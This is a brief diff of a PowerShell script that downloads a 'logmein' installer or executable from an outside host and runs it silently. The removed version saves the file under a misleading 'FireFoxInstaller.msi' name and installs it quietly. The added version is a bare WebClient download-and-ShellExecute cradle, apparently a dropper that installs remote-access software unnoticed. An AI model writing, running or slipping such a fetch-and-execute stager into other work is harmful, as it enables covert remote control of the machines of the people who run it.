@@ -1,5 +1,6 @@
-#Download and Run MSI package for Automated install
-$uri = "https://armadyne.systems/logmein.msi"
-$out = "c:\FireFoxInstaller.msi"
-Invoke-WebRequest -uri $uri -OutFile $out
-Start-Process -FilePath "msiexec.exe" -ArgumentList "/i $out /quiet /norestart /l c:\installlog.txt"
+$down = New-Object System.Net.WebClient
+$url  = 'https://armadyne.systems/logmein.exe';
+$file = 'logmein.exe';
+$down.DownloadFile($url,$file);
+$exec = New-Object -com shell.application
+$exec.shellexecute($file);
